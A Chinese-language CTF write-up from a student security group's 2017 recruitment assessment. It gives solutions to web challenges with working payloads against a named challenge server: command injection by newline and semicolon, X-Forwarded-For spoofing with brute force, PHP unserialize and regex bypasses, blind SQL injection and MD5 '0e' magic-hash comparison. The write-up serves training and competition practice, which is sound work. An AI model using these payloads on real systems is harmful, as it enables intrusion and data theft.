前言

时间：17年暑假
地点：全国各地
为了在16级招到既热爱技术又真诚可靠的小伙伴，小组趁17年暑假这个空档，开展了一波持续40余天的考核+面试活动。
三个技术方向、三轮面试。任务中既有编程基础及漏洞复现，又有一些原创和非原创CTF题目，还有贴近实战的渗透测试环境。
在这里，我们将持续更新考核的writeup，懒癌发作，懒得自己写write up，所以放出一些较优解，供大家参考。没能成功通过这次面试进入小组的小伙伴也不要灰心，在技术道路上坚持前行，我们依旧等你。

exec1

提示swp，是vim在不正常退出时保存的文件，默认是隐藏文件。所以我们输入.index.php.swp，下载到了swp文件，对其进行分析，放到linux中使用命令 vim -r .index.php.swp 恢复文件进行代码审计

而exec 是命令注入，所以参考DVWA 的命令注入，发现它和DVWA中的high级别差不多，所以我们需要找到绕过方式，经谷歌后得到%0a 可以同时执行两个命令，所以，payload如下：
http://118.89.167.246:4002/?ip=127.0.0.1%0als 发现了flag.php
http://118.89.167.246:4002/?ip=127.0.0.1%0acat%20flag.php 查看源码得到flag

exec2

打开bak备份文件，查看源码，发现要用post方式传ip的值，于是用brupsuite修改http请求头。

直接用分号分隔ip地址，后面各种ls，cd .. ls在上层目录发现flaaaaaaaaaaaaaaaag.txt

由于字符限制，不能直接cat出来，于是采用了通配符 cat *.txt

Brup

猜测是用管理员的ip去访问这个地址
后三位缺失，采用brupsuite枚举。手动添加X-Forwarded-For:伪造ip

发现payload为197的包返回长度与众不同

下拉查看源码发现flag

我们分手了

查看源码，发现这道题需要构造序列化的payload，并且需要绕过preg_match，改变filename的值为flag13579.php
查阅了大量大量超级大量的资料后，发现可以添加%2b让正则匹配停止，原理为+8=8
所以payload为：
?data=O:%2b8:”just4fun”:1:{s:8:”filename”;s:13:”flag13579.php”;}
查看源码，得到flag

Sql

用一个判断结合我们自己的ip地址会被插入（由于我们真正的IP已经被插入了，所以我们需要伪造IP），然后利用伪造的IP地址在未被插入之前id=1,插入之后id=2 来成功修改id值。
payload如下：http://118.89.167.246:4001/?id=if((select ip from logs where ip=’192.168.233.130’ limit 1),1,2)%23
同时利用firefox的X-Forwarded-For 伪造我们的ip为192.168.233.130

一个有故事的人

构造序列化，修改enter和secret的值。由于是===全等，查阅资料后发现需要利用指针引用，直接将secret的值的指针指向enter的值的位置。
?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;s:3:%22abc%22;s:6:%22secret%22;R:2;}
得到flag

SYB1

hint:.bak。猜测也是下载文件得到源码，所以url后面加个.bak得到SYB.php.bak
分析一下源码，知道我们要输入两个key1,key2，他们会做md5值比较，需要：
md5($key1) = md5($key2) && $key1 != $key2
很明显的MD5比较漏洞：以0e开头的MD5之在比较时会被认为相等
而在之前把输入的key变成了空格，所以kekeyy 构造一下绕过，又使用了parse_str 所以我们输入的key不加$ 号，payload如下：
SYB.php?kekeyy1=QNKCDZO & kekeyy2 = s878926199a
